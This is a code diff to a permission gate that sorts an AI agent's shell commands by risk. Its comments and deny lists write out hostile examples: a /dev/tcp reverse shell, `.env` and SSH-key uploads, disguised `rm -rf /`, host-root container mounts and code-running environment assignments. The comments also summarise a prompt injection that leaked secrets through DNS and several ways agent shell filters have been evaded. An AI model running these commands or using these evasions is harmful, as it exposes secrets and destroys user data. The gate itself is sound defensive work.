@@ -66,7 +66,15 @@ export function toolPathCandidates(toolInput: Record<string, unknown>): string[]
   return found
 }
 
-/** Verbs that open an egress channel. */
+/**
+ * Verbs that open an egress channel.
+ *
+ * The cloud and cluster CLIs are here wholesale because every subcommand they
+ * have talks to an API, and DNS tools are here because DNS is a documented
+ * exfiltration route that gets past egress filtering: CVE-2025-55284 hid a
+ * prompt in a file Claude Code analysed and left with the `.env` contents in
+ * DNS queries rather than an HTTP request.
+ */
 const NETWORK_VERBS = new Set([
   "curl",
   "wget",
@@ -79,7 +87,34 @@ const NETWORK_VERBS = new Set([
   "sftp",
   "ftp",
   "lftp",
+  "socat",
+  "rclone",
+  "mosh",
+  "aws",
+  "gcloud",
+  "az",
+  "kubectl",
+  "dig",
+  "nslookup",
+  "host",
+  "ping",
+  "ping6",
+  "traceroute",
+  "tracepath",
+  "mtr",
 ])
+
+/**
+ * Verbs that only open a channel for some subcommands, so the subcommand is
+ * read before the segment counts as network. `docker ps` and `gh --version` are
+ * local; `docker push` and `gh release upload` are not.
+ */
+const NETWORK_SUBCOMMAND_VERBS: Record<string, Set<string>> = {
+  docker: new Set(["push", "pull", "login"]),
+  podman: new Set(["push", "pull", "login"]),
+  gh: new Set(["api", "release", "gist"]),
+  openssl: new Set(["s_client", "s_server"]),
+}
 
 /** Git subcommands that talk to a remote. */
 const NETWORK_GIT_SUBCOMMANDS = new Set(["push", "fetch", "clone", "pull", "remote", "ls-remote"])
@@ -139,11 +174,55 @@ export function findSecretPath(
   return null
 }
 
-/** True when any word of a shell command names a secret location. */
-function commandNamesSecret(segments: CommandSegment[]): boolean {
-  return segments
-    .flatMap((segment) => segment.words)
-    .some((word) => SECRET_PATH_PATTERNS.some((pattern) => pattern.test(word)))
+/**
+ * True when some segment names a secret location without writing to it.
+ *
+ * A segment that redirects is writing, and a write to `~/.ssh/authorized_keys`
+ * is a protected-path overwrite rather than a leak, so it stays with the
+ * destructive pattern that already names it and keeps its own accurate reason.
+ * Everything else that names a secret is treated as a read, because the gate
+ * cannot tell `cat` from `chmod` reliably and the cost of guessing wrong in the
+ * other direction is a private key in a provider's context.
+ */
+function commandReadsSecret(segments: CommandSegment[]): boolean {
+  return segments.some((segment) =>
+    segment.words.some((word, index) => namesSecret(word) && !isWriteTarget(segment, index)),
+  )
+}
+
+/**
+ * True when the word at this index is being written to rather than read.
+ *
+ * Only the redirect target counts. An earlier version of this check asked
+ * whether the segment contained a redirect anywhere, which made
+ * `cat ~/.ssh/id_ed25519 2>/dev/null` look like a write and let the key through,
+ * because a stderr redirect says nothing about where standard output goes. The
+ * question that matters is whether this word sits on the receiving end of one.
+ */
+function isWriteTarget(segment: CommandSegment, index: number): boolean {
+  if (segment.verb === "tee") return true
+  const word = segment.words[index] ?? ""
+  if (word.startsWith(">")) return true
+  const previous = segment.words[index - 1] ?? ""
+  return previous.endsWith(">")
+}
+
+/**
+ * True when a word names a secret location, including through the punctuation
+ * that attaches it to something else. `curl -F file=@.env` uploads a dotenv with
+ * no space between the flag, the assignment and the path, and matching the whole
+ * word only would have called that an ordinary network call.
+ */
+function namesSecret(word: string): boolean {
+  const candidates = [word, word.replace(/^@/, "")]
+  const separator = word.indexOf("=")
+  if (separator >= 0) {
+    const value = word.slice(separator + 1)
+    candidates.push(value, value.replace(/^@/, ""))
+  }
+  return candidates.some((candidate) =>
+    SECRET_PATH_PATTERNS.some((pattern) => pattern.test(candidate)),
+  )
 }
 
 /**
@@ -163,8 +242,12 @@ function commandNamesSecret(segments: CommandSegment[]): boolean {
 const WRAPPER_VERBS = new Set([
   "sudo",
   "doas",
+  "su",
+  "runuser",
+  "pkexec",
   "env",
   "command",
+  "builtin",
   "exec",
   "nohup",
   "nice",
@@ -175,6 +258,13 @@ const WRAPPER_VERBS = new Set([
   "xargs",
   "setsid",
   "chroot",
+  "unshare",
+  "nsenter",
+  "systemd-run",
+  "machinectl",
+  "script",
+  "watch",
+  "parallel",
   "sh",
   "bash",
   "zsh",
@@ -203,12 +293,30 @@ const WRAPPER_VALUE_FLAGS = new Set([
   "--cores",
 ])
 
+/**
+ * Wrappers whose first argument is a subject rather than a command, so the
+ * subject is skipped with the wrapper. `su root -c "rm -rf /"` read its verb as
+ * `root` without this, which is not a delete and not a wrapper, so the command
+ * landed in `approval`. `su -c "rm -rf /"` needs no skip, because its first
+ * argument is already a flag.
+ */
+const WRAPPER_SUBJECT_VERBS = new Set(["su", "runuser"])
+
 /** A bare duration, which is what `timeout` and `time` take as their argument. */
 const DURATION_WORD = /^\d+(?:\.\d+)?[smhd]?$/
 
-/** Drop quote characters, so `of="/dev/sda"` reads as `of=/dev/sda`. */
+/**
+ * Normalise one word so a hidden verb cannot ride through it.
+ *
+ * Quotes are dropped, which is what turns `of="/dev/sda"` into `of=/dev/sda` and
+ * `c"h"m"o"d` into `chmod`. Backslashes become forward slashes for two reasons:
+ * `\rm -rf /` is the classic spelling that steps around a shell alias and it
+ * resolves to the verb `rm` once the basename is taken, and a Windows path gains
+ * the separators the secret patterns match on, so `C:\Users\me\.ssh\id_rsa`
+ * reaches the `.ssh/` rule instead of sliding past it.
+ */
 function unquote(word: string): string {
-  return word.replace(/["'`]/g, "")
+  return word.replace(/\\/g, "/").replace(/["'`]/g, "")
 }
 
 /**
@@ -226,7 +334,11 @@ function readVerb(words: string[]): string {
     }
     const base = word.split("/").pop() ?? word
     if (DURATION_WORD.test(base)) continue
-    if (WRAPPER_VERBS.has(base)) continue
+    if (WRAPPER_VERBS.has(base)) {
+      const subject = words[index + 1]
+      if (WRAPPER_SUBJECT_VERBS.has(base) && subject && !subject.startsWith("-")) index += 1
+      continue
+    }
     return base
   }
   return ""
@@ -234,26 +346,40 @@ function readVerb(words: string[]): string {
 
 /**
  * Split a shell command into segments on the operators that start a new
- * command. This is not a shell parser and does not claim to be one, and it is
- * not a security boundary on its own: an interpreter that takes inline code,
- * `python -c` or `node -e`, still hides whatever it runs. That gap is recorded
- * in `.dump/app/decisions/2026-09-13-permission-floor.md` rather than papered
- * over here, because the research on agent shell filters is unanimous that a
- * pattern list cannot win against a shell grammar and only an OS sandbox can.
+ * command. `$IFS` becomes a space first, because it is the shell's own field
+ * separator and `rm$IFS-rf$IFS/` is a documented way to write `rm -rf /` without
+ * a literal space for a matcher to split on.
+ *
+ * This is not a shell parser and does not claim to be one, and it is not a
+ * security boundary on its own: an interpreter that takes inline code,
+ * `python -c` or `node -e`, still hides whatever it runs, and so do glob and
+ * parameter spellings such as `/usr/bin/n[c]` and `who$@ami`. That gap is
+ * recorded in `.dump/app/decisions/2026-09-13-permission-floor.md` rather than
+ * papered over here, because the research on agent shell filters is unanimous
+ * that a pattern list cannot win against a shell grammar and only an OS sandbox
+ * can.
  */
 export function splitCommandSegments(command: string): CommandSegment[] {
-  return command
-    .split(/&&|\|\||[|;\n`()]|\$\(/)
-    .map((raw) => raw.trim())
-    .filter((text) => text.length > 0)
-    .map((text) => {
-      const words = text
-        .split(/\s+/)
-        .filter((word) => word.length > 0)
-        .map((word) => unquote(word).toLowerCase())
-        .filter((word) => word.length > 0)
-      return { verb: readVerb(words), words }
-    })
+  return (
+    command
+      .replace(/\$\{?ifs\}?/gi, " ")
+      // `find . \( -name x \) -delete` groups its predicates with escaped
+      // parentheses, which are arguments rather than a subshell. Splitting on them
+      // put `-delete` in a segment of its own, away from the `find` that carries
+      // it, and the delete read as an ordinary command.
+      .replace(/\\\(|\\\)/g, " ")
+      .split(/&&|\|\||[|;\n`()]|\$\(/)
+      .map((raw) => raw.trim())
+      .filter((text) => text.length > 0)
+      .map((text) => {
+        const words = text
+          .split(/\s+/)
+          .filter((word) => word.length > 0)
+          .map((word) => unquote(word).toLowerCase())
+          .filter((word) => word.length > 0)
+        return { verb: readVerb(words), words }
+      })
+  )
 }
 
 function hasRecursiveForceRm(segments: CommandSegment[]): boolean {
@@ -269,8 +395,52 @@ function hasRecursiveForceRm(segments: CommandSegment[]): boolean {
   })
 }
 
+/**
+ * True when the command redirects into a protected location.
+ *
+ * `/dev/tcp` and `/dev/udp` are excluded because they are bash's pseudo-device
+ * sockets rather than files, and `exec 196<>/dev/tcp/host/port` is a network
+ * connection. Calling that a write into a protected directory would deny it for
+ * the wrong reason, and the network rule names what it actually is.
+ */
+/** Verbs whose argument is always a destination, so any position counts. */
+const WRITES_TO_ARGUMENT = new Set(["tee", "truncate"])
+
+/** Verbs whose destination is their last argument, so only that one counts. */
+const MOVES_INTO_ARGUMENT = new Set(["cp", "mv", "install"])
+
+/**
+ * Locations a write needs a card for. `/dev` is absent because the block-device
+ * rule covers it precisely, and a prefix match there would call `dd of=/dev/null`
+ * a disk reformat.
+ */
+const PROTECTED_WRITE_PREFIXES = ["/etc/", "~/.ssh/", "/usr/", "/bin/", "/sbin/", "/boot/"]
+
 function hasProtectedRedirect(command: string): boolean {
-  return />\s*(\/etc\/|~\/\.ssh\/|\/usr\/|\/bin\/|\/sbin\/|\/boot\/|\/dev\/)/.test(command)
+  return />\s*(\/etc\/|~\/\.ssh\/|\/usr\/|\/bin\/|\/sbin\/|\/boot\/|\/dev\/(?!tcp|udp))/.test(
+    command,
+  )
+}
+
+/**
+ * True when a write verb targets a protected location with no redirect operator
+ * to match. `tee ~/.ssh/authorized_keys` installs a key and would otherwise land
+ * in the approval class, which Agent mode allows.
+ */
+function writesProtectedPath(segments: CommandSegment[]): boolean {
+  return segments.some((segment) => {
+    if (WRITES_TO_ARGUMENT.has(segment.verb)) return segment.words.some(isProtectedLocation)
+    // `cp /etc/passwd /tmp/copy` reads a protected file and writes an ordinary
+    // one, so a copy verb only counts when the protected path is where the bytes
+    // are going, which is its last argument.
+    if (MOVES_INTO_ARGUMENT.has(segment.verb))
+      return isProtectedLocation(segment.words.at(-1) ?? "")
+    return false
+  })
+}
+
+function isProtectedLocation(word: string): boolean {
+  return PROTECTED_WRITE_PREFIXES.some((prefix) => word.startsWith(prefix))
 }
 
 function hasDestructiveSql(command: string): boolean {
@@ -300,12 +470,92 @@ function isForceSpelling(word: string): boolean {
   return /^-[a-z]*f[a-z]*$/.test(word)
 }
 
-function hasDiscardingGitCommand(command: string): boolean {
-  return /\bgit\s+reset\s+--hard\b/.test(command) || /\bgit\s+clean\b[^\n]*\s-[a-z]*f/.test(command)
+/**
+ * A git command that throws work away. Read from the segment rather than by
+ * regex over the whole command, for the reason `hasForcedGitPush` gives: git's
+ * own global options sit between `git` and the subcommand, so
+ * `git -C /repo reset --hard` and `git --no-pager clean -fdx` both defeat a
+ * pattern that expects the two words to be adjacent. Fixing that for `push` and
+ * leaving it here would have been half a fix.
+ */
+function hasDiscardingGitCommand(segments: CommandSegment[]): boolean {
+  return segments.some((segment) => {
+    if (segment.verb !== "git") return false
+    const subcommand = readSubcommand(segment)
+    if (subcommand === "reset") return segment.words.includes("--hard")
+    if (subcommand === "clean") return segment.words.some(isForceSpelling)
+    if (subcommand === "stash") {
+      return segment.words.includes("clear") || segment.words.includes("drop")
+    }
+    if (subcommand === "reflog") return segment.words.includes("expire")
+    if (subcommand === "update-ref" || subcommand === "tag") {
+      return segment.words.some((word) => word === "-d" || word === "--delete")
+    }
+    // `filter-branch` and `filter-repo` rewrite every commit in the repository,
+    // which is unrecoverable once the originals are garbage collected.
+    return subcommand === "filter-branch" || subcommand === "filter-repo"
+  })
+}
+
+/**
+ * A forced branch delete. Checked against the raw command because the segment
+ * words arrive lowercased, and lowercasing is what makes `git branch -D`, which
+ * discards an unmerged branch, indistinguishable from `git branch -d`, which
+ * refuses to. The character class stands in for the segment boundary so git's
+ * global options between `git` and `branch` do not defeat the match, which is
+ * the same adjacency problem the segment-based checks above exist to avoid.
+ */
+const FORCED_BRANCH_DELETE = /\bgit\b[^|;&\n]*\bbranch\b[^|;&\n]*(?:-[a-z]*D|--delete)/
+
+function hasForcedBranchDelete(command: string): boolean {
+  return FORCED_BRANCH_DELETE.test(command)
 }
 
 /** Partition and filesystem tools, which destroy data whatever their args. */
-const DISK_VERBS = new Set(["wipefs", "fdisk", "cfdisk", "sfdisk", "parted", "sgdisk", "gdisk"])
+const DISK_VERBS = new Set([
+  "wipefs",
+  "fdisk",
+  "cfdisk",
+  "sfdisk",
+  "parted",
+  "sgdisk",
+  "gdisk",
+  "mkswap",
+  "partprobe",
+])
+
+/**
+ * Tools that destroy a device only for some subcommands, so the subcommand or
+ * the flag is read before the segment counts. `nvme list` and `mdadm --detail`
+ * are reads, while `nvme format` and `mdadm --zero-superblock` are not, and
+ * treating the verb alone as destructive would ask for a card on every query.
+ */
+const DISK_SUBCOMMAND_VERBS: Record<string, Set<string>> = {
+  nvme: new Set(["format", "sanitize"]),
+  dmsetup: new Set(["remove", "remove_all", "wipe_table", "suspend"]),
+  losetup: new Set(["-d", "--detach", "-D", "--detach-all"]),
+}
+
+/** Flags whose presence makes the verb destructive rather than a query. */
+const DISK_DESTRUCTIVE_FLAGS: Record<string, RegExp> = {
+  hdparm: /^--(security-erase|security-erase-null|make-bad|fwdownload)/,
+  mdadm: /^--(zero-superblock|remove|stop|zero)/,
+  badblocks: /^-[a-z]*w/,
+  smartctl: /^--(security-erase|sanitize)/,
+}
+
+/** Verbs that write their input somewhere, so the target decides the danger. */
+const WRITE_VERBS = new Set(["dd", "tee", "truncate", "cat", "cp", "shred"])
+
+/**
+ * A block device rather than any `/dev` entry. `/dev/null`, `/dev/zero`,
+ * `/dev/stdout` and `/dev/shm` are not storage and writing to them destroys
+ * nothing, so matching `/dev/` as a prefix called `dd if=x of=/dev/null` a disk
+ * reformat. The pseudo-device sockets `/dev/tcp` and `/dev/udp` are excluded for
+ * the same reason, and they are a network rule instead.
+ */
+const BLOCK_DEVICE =
+  /^\/dev\/(sd[a-z]|hd[a-z]|vd[a-z]|xvd[a-z]|nvme\d|md\d|loop\d|mmcblk\d|sr\d|zd\d|dasd|mapper\/|disk\/|block\/)/
 
 /** Power-state verbs, whether invoked directly or through a service manager. */
 const POWER_VERBS = new Set(["shutdown", "reboot", "halt", "poweroff"])
@@ -314,12 +564,10 @@ function hasDiskOrPowerVerb(segments: CommandSegment[]): boolean {
   return segments.some((segment) => {
     if (segment.verb.startsWith("mkfs")) return true
     if (DISK_VERBS.has(segment.verb)) return true
-    if (segment.verb === "dd") {
-      return segment.words.some((word) => word.startsWith("of=/dev/"))
-    }
-    if (segment.verb === "shred") {
-      return segment.words.some((word) => word.startsWith("/dev/"))
-    }
+    if (writesBlockDevice(segment)) return true
+    if (DISK_SUBCOMMAND_VERBS[segment.verb]?.has(readSubcommand(segment))) return true
+    const flag = DISK_DESTRUCTIVE_FLAGS[segment.verb]
+    if (flag && segment.words.some((word) => flag.test(word))) return true
     if (segment.verb === "chmod" && segment.words.includes("777")) {
       return segment.words.some((word) => word === "/" || word.startsWith("/*"))
     }
@@ -333,16 +581,201 @@ function hasDiskOrPowerVerb(segments: CommandSegment[]): boolean {
 }
 
 /**
- * A `find` that deletes what it matches. It removes a whole tree with no `rm`
- * in the command line, so a delete check keyed on `rm` alone misses it.
+ * True when the segment writes to a block device. `dd` names its output with
+ * `of=`, which is why the check reads that word rather than the whole segment,
+ * and every other write verb takes the device as a positional argument.
  */
-function hasFindDelete(segments: CommandSegment[]): boolean {
-  return segments.some((segment) => segment.verb === "find" && segment.words.includes("-delete"))
+function writesBlockDevice(segment: CommandSegment): boolean {
+  if (!WRITE_VERBS.has(segment.verb)) return false
+  if (segment.verb === "dd") {
+    return segment.words.some((word) => word.startsWith("of=") && BLOCK_DEVICE.test(word.slice(3)))
+  }
+  return segment.words.some((word) => BLOCK_DEVICE.test(word))
+}
+
+/**
+ * A `find` that removes what it matches, with no `rm` in the leading position
+ * for a verb check to find. `-delete` is the obvious spelling and `-exec rm` is
+ * the one that gets past a denylist keyed on `rm`, which is a reported bypass
+ * against a shipped agent in the wild. CVE-2026-55743 is the same oversight one
+ * layer down: the guard blocked `-exec` and `-ok` but not the functionally
+ * identical `-execdir` and `-okdir`, so all four are covered here.
+ *
+ * An exec'd path is caught as well as an exec'd delete verb, because
+ * `find . -execdir /tmp/run.sh {} ;` runs attacker-chosen code once per matched
+ * file and names no delete verb at all.
+ */
+function findDeletes(segment: CommandSegment): boolean {
+  if (segment.verb !== "find") return false
+  if (segment.words.includes("-delete")) return true
+  const flagIndex = segment.words.findIndex((word) => FIND_EXEC_FLAGS.has(word))
+  if (flagIndex < 0) return false
+  const executed = segment.words[flagIndex + 1]
+  if (executed === undefined) return false
+  if (DELETE_VERBS.has(executed.split("/").pop() ?? executed)) return true
+  return executed.startsWith("/") || executed.startsWith("./") || SCRIPT_SUFFIX.test(executed)
+}
+
+/** The `find` predicates that run a command per matched file. */
+const FIND_EXEC_FLAGS = new Set(["-exec", "-execdir", "-ok", "-okdir"])
+
+/** Verbs that remove a file, whichever of them `find` is told to run. */
+const DELETE_VERBS = new Set(["rm", "rmdir", "shred", "unlink"])
+
+/** A suffix that makes a word an executable script rather than an argument. */
+const SCRIPT_SUFFIX = /\.(sh|bash|zsh|py|pl|rb|js|mjs|cjs|exe)$/
+
+/**
+ * Environment assignments that make an allowlisted binary run code the caller
+ * chose. `LD_PRELOAD=/tmp/x.so git status` reads as the verb `git`, which is
+ * ordinary, and then loads the shared object into it. The assignment is the
+ * payload and the binary is only the carrier, so the verb check cannot see it.
+ *
+ * CVE-2026-55743 is exactly this shape: a shipped desktop agent stripped leading
+ * `KEY=value` assignments before validating the command, so
+ * `GIT_PAGER=/tmp/payload.sh git log` ran the payload through an allowlisted
+ * `git`. Benign assignments stay allowed, and the published benign examples are
+ * `TZ=UTC git log` and `NODE_ENV=production npm test`, which is why the variable
+ * name has to be one that carries code and the value has to look executable.
+ * `GIT_PAGER=cat` and `EDITOR=vim` are neither.
+ */
+const CODE_EXECUTION_ENV_VARS = new Set([
+  "ld_preload",
+  "ld_audit",
+  "ld_library_path",
+  "bash_env",
+  "bash_func",
+  "env",
+  "shell",
+  "pythonstartup",
+  "pythonpath",
+  "perl5opt",
+  "rubyopt",
+  "node_options",
+  "git_pager",
+  "git_editor",
+  "git_sequence_editor",
+  "git_external_diff",
+  "git_ssh_command",
+  "git_proxy_command",
+  "git_hook_path",
+  "git_config",
+  "git_config_global",
+  "git_config_system",
+  "core.pager",
+  "core.editor",
+  "core.sshcommand",
+  "core.hookspath",
+  "core.fsmonitor",
+  "core.askpass",
+  "git_askpass",
+  "git_template_dir",
+  "ssh_askpass",
+  "pager",
+  "editor",
+  "visual",
+  "sequence.editor",
+  "diff.external",
+  "prompt_command",
+  "lessopen",
+  "lessclose",
+  "java_tool_options",
+  "jdk_java_options",
+  "git_config_count",
+])
+
+/**
+ * The numbered form of git's config injection, which needs no shell quoting and
+ * no config file: `GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=core.pager
+ * GIT_CONFIG_VALUE_0=/tmp/x.sh git log`. The suffix is an index, so the names
+ * cannot be listed and are matched instead.
+ */
+const NUMBERED_GIT_CONFIG = /^git_config_(key|value)_\d+$/
+
+function hasCodeExecutionEnvAssignment(command: string, segments: CommandSegment[]): boolean {
+  // An assignment cannot exist without one, and this runs on every shell command
+  // the gate sees, so the cheap test comes before either scan.
+  if (!command.includes("=")) return false
+  if (segments.some((segment) => segment.words.some(isCodeExecutionAssignment))) return true
+  // A second scan over the raw command, because the segment splitter breaks on a
+  // pipe and a value can contain one. `LESSOPEN='|/tmp/x.sh %s' less file` is a
+  // real spelling and its assignment lands in a segment of its own, halved.
+  const lower = command.toLowerCase()
+  for (const match of lower.matchAll(/([a-z_][\w.]*)=([^\s;]*)/g)) {
+    const [, name, value] = match
+    if (name === undefined || value === undefined) continue
+    if (!CODE_EXECUTION_ENV_VARS.has(name) && !NUMBERED_GIT_CONFIG.test(name)) continue
+    if (looksExecutable(value.replace(/["'`]/g, ""))) return true
+  }
+  return false
+}
+
+function isCodeExecutionAssignment(word: string): boolean {
+  const separator = word.indexOf("=")
+  if (separator <= 0) return false
+  const name = word.slice(0, separator)
+  if (!CODE_EXECUTION_ENV_VARS.has(name) && !NUMBERED_GIT_CONFIG.test(name)) return false
+  return looksExecutable(word.slice(separator + 1))
+}
+
+/** True when an assigned value names a file that could be run or loaded. */
+function looksExecutable(value: string): boolean {
+  if (value.length === 0) return false
+  if (value.startsWith("/") || value.startsWith("./") || value.startsWith("~/")) return true
+  if (value.includes("/")) return true
+  return SCRIPT_SUFFIX.test(value) || value.endsWith(".so") || value.endsWith(".dll")
 }
 
 /** A `shred` of anything. It overwrites a file so it cannot be recovered. */
 function hasShred(segments: CommandSegment[]): boolean {
   return segments.some((segment) => segment.verb === "shred")
+}
+
+/** Container verbs that start a process, so a volume mount becomes a host write. */
+const CONTAINER_RUN_SUBCOMMANDS: Record<string, Set<string>> = {
+  docker: new Set(["run", "create", "exec"]),
+  podman: new Set(["run", "create", "exec"]),
+}
+
+/** Host paths whose mount into a container defeats the worktree containment. */
+const HOST_MOUNT_PATHS = ["/", "~", "/etc", "/home", "/root", "/var", "/usr", "/bin", "/dev"]
+
+/**
+ * True when a container is started with the host's own filesystem mounted in.
+ * `docker run -v /:/host alpine rm -rf /host` runs an unrestricted delete on the
+ * host through a path the gate never sees, and a container is a network rule for
+ * its pull, which turbo allows, so the mount itself has to be the thing caught.
+ */
+function hasHostRootMount(segments: CommandSegment[]): boolean {
+  return segments.some((segment) => {
+    if (!CONTAINER_RUN_SUBCOMMANDS[segment.verb]?.has(readSubcommand(segment))) return false
+    return segment.words.some(isHostMountSpec)
+  })
+}
+
+function isHostMountSpec(word: string): boolean {
+  const host = mountHostOf(word)
+  if (host === null || host.length === 0) return false
+  return HOST_MOUNT_PATHS.some((path) => host === path || host.startsWith(`${path}/`))
+}
+
+/**
+ * The host side of a bind mount in one word, or null when the word is not a
+ * mount specification. All three spellings count: `-v /:/host` puts the spec in
+ * the word after the flag, `--volume=/:/host` glues it on, and
+ * `--mount=type=bind,source=/,target=/host` names it as a key.
+ */
+function mountHostOf(word: string): string | null {
+  if (word.startsWith("--mount=")) {
+    const source = word
+      .slice("--mount=".length)
+      .split(",")
+      .find((part) => part.startsWith("source="))
+    return source === undefined ? null : source.slice("source=".length)
+  }
+  if (word.startsWith("--volume=")) return word.slice("--volume=".length).split(":")[0] ?? null
+  const colon = word.indexOf(":")
+  return colon >= 0 ? word.slice(0, colon) : null
 }
 
 function hasInitKill(segments: CommandSegment[]): boolean {
@@ -361,8 +794,14 @@ export const DESTRUCTIVE_PATTERNS: CommandPattern[] = [
   },
   {
     id: "bulk-find-delete",
-    test: (_command, segments) => hasFindDelete(segments),
-    reason: "a find with -delete removes every path it matches, with no undo",
+    test: (_command, segments) => segments.some(findDeletes),
+    reason: "a find that deletes or execs a delete removes every path it matches, with no undo",
+  },
+  {
+    id: "env-injection",
+    test: (command, segments) => hasCodeExecutionEnvAssignment(command, segments),
+    reason:
+      "an environment assignment makes the command that follows run code from a path this run chose",
   },
   {
     id: "shred",
@@ -381,18 +820,25 @@ export const DESTRUCTIVE_PATTERNS: CommandPattern[] = [
   },
   {
     id: "discarding-git-command",
-    test: (command) => hasDiscardingGitCommand(command),
-    reason: "a hard reset or forced clean discards uncommitted work",
+    test: (command, segments) =>
+      hasDiscardingGitCommand(segments) || hasForcedBranchDelete(command),
+    reason: "a hard reset, forced clean or history rewrite discards work",
   },
   {
     id: "protected-path-overwrite",
-    test: (command) => hasProtectedRedirect(command),
+    test: (command, segments) => hasProtectedRedirect(command) || writesProtectedPath(segments),
     reason: "the command writes into a protected system directory",
   },
   {
     id: "disk-or-power",
     test: (_command, segments) => hasDiskOrPowerVerb(segments),
     reason: "the command reformats a device or changes machine power state",
+  },
+  {
+    id: "host-root-mount",
+    test: (_command, segments) => hasHostRootMount(segments),
+    reason:
+      "the command mounts the host filesystem into a container, which steps outside the worktree",
   },
   {
     id: "init-kill",
@@ -457,7 +903,7 @@ export function criticalPathBreach(
  */
 function segmentDeletes(segment: CommandSegment): boolean {
   if (segment.verb === "rm" || segment.verb === "rmdir") return true
-  return segment.verb === "find" && segment.words.includes("-delete")
+  return findDeletes(segment)
 }
 
 /**
@@ -534,8 +980,22 @@ function segmentOpensNetwork(segment: CommandSegment): boolean {
   if (NETWORK_VERBS.has(segment.verb)) return true
   if (segment.verb === "git") return NETWORK_GIT_SUBCOMMANDS.has(readSubcommand(segment))
   if (hasRemoteRsync(segment)) return true
+  if (opensSocketDevice(segment)) return true
+  const bySubcommand = NETWORK_SUBCOMMAND_VERBS[segment.verb]
+  if (bySubcommand?.has(readSubcommand(segment))) return true
   const publish = NETWORK_PUBLISH_SUBCOMMANDS[segment.verb]
   return publish ? publish.has(readSubcommand(segment)) : false
+}
+
+/**
+ * True when the segment redirects through bash's pseudo-device socket, which is
+ * a network connection with no network verb anywhere on the line.
+ * `bash -i >& /dev/tcp/10.0.0.1/8080 0>&1` is the canonical reverse shell and is
+ * a published detection indicator in its own right, so the spelling is matched
+ * wherever it appears in a word rather than only after a redirect operator.
+ */
+function opensSocketDevice(segment: CommandSegment): boolean {
+  return segment.words.some((word) => word.includes("/dev/tcp/") || word.includes("/dev/udp/"))
 }
 
 function hasNetworkVerb(segments: CommandSegment[]): boolean {
@@ -591,11 +1051,20 @@ export function classifyToolAction(
 function classifyCommand(command: string): ClassifiedAction {
   const segments = splitCommandSegments(command)
 
-  if (commandNamesSecret(segments) && hasNetworkVerb(segments)) {
+  // A network verb is not required. The model's context is uploaded to the
+  // provider by design, so a command that prints a secret has already moved it
+  // off this machine by the time anything downstream could act, and the gate
+  // cannot unsend a tool result. This is the same boundary the file-tool path
+  // draws in `findSecretPath`, and requiring egress here would have left
+  // `cat ~/.ssh/id_ed25519` in the approval class, which Agent mode allows.
+  if (commandReadsSecret(segments)) {
+    const egress = hasNetworkVerb(segments)
     return {
       ruleClass: "exfiltration",
-      ruleId: "secret-egress",
-      reason: "the command sends a secret path over a network channel",
+      ruleId: egress ? "secret-egress" : "secret-command",
+      reason: egress
+        ? "the command sends a secret path over a network channel"
+        : "the command names a secret location, so anything it prints enters the model's context",
     }
   }
 
